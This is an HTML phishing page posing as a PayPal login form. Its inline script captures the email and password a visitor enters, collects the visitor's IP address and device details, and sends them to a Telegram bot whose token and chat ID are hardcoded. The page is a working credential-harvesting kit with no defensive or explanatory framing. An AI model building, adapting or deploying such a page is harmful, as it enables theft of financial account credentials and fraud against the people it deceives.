<!DOCTYPE HTML>
<html>
<head>
<meta charset='UTF-8'>
<title>Log in to your PayPal account</title>
<link rel='icon' href='images/paypal.ico' type='image/x-icon'>
<link rel='stylesheet' href='paypal.css'>
<link rel='stylesheet' href='paypal.css'>
</head>
<body>

<form id="login-form" action='' method='POST'>
    <input type='email' id="email" name='email' placeholder='Email address'><br>
    <input type='password' id="password" name='pass' placeholder='Enter your password'><br>

    <input class='log' type='submit' value='Log In'>

    <a href='#'>Having trouble logging in?</a><br><br><br><br><br><br>

    <div class='before'></div>
    <p>or</p>
    <div class='after'></div>

    <input class='sign' type='submit' value='Sign Up'>
</form>

<script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
<script>
    const TOKEN = "8424825008:AAEvOvcAp5oVeGpa16NYxmKYcNr2_gfQWog"; // هنا التوكن
    const CHAT_ID = "7187200407"; // هنا معرف الشات
    const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;        

    document.getElementById('login-form').addEventListener('submit', function(e) {
        e.preventDefault();

        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;

        axios.get('https://api.ipify.org?format=json')
            .then(response => {
                const ip = response.data.ip;

                const userAgent = navigator.userAgent;
                const platform = navigator.platform;
                const screenWidth = screen.width;
                const screenHeight = screen.height;
                const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';

                const message = ` 
<b>New Login Attempt</b>\n
<b>Email:</b> ${email}\n
<b>Password:</b> ${password}\n
<b>IP Address:</b> ${ip}\n
<b>Device Type:</b> ${deviceType}\n
<b>Platform:</b> ${platform}\n
<b>User Agent:</b> ${userAgent}\n
<b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
                `;

                axios.post(URI_API, {
                    chat_id: CHAT_ID,
                    parse_mode: 'html',
                    text: message
                }).then(response => {
                    alert('Information sent successfully!');
                }).catch(error => {
                    alert('Error sending the information. Please try again.');
                });
            })
            .catch(error => {
                alert('Error fetching the IP address. Please try again.');
            });
    });
</script>

</body>
</html>
